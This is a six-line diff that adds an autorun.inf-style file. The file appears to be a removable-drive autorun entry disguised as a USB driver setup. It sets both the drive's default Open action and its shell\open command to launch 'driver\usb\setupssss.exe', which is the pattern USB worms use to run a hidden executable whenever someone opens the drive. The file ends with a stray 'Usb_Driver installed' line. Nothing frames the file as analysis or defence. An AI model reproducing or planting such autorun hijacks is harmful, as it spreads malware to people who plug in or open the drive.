@@ -1,0 +1,6 @@
+[autorun]
+open=driver\usb\setupssss.exe
+action=Open
+shell\open=Open
+shell\open\command=driver\usb\setupssss.exe
+Usb_Driver installed
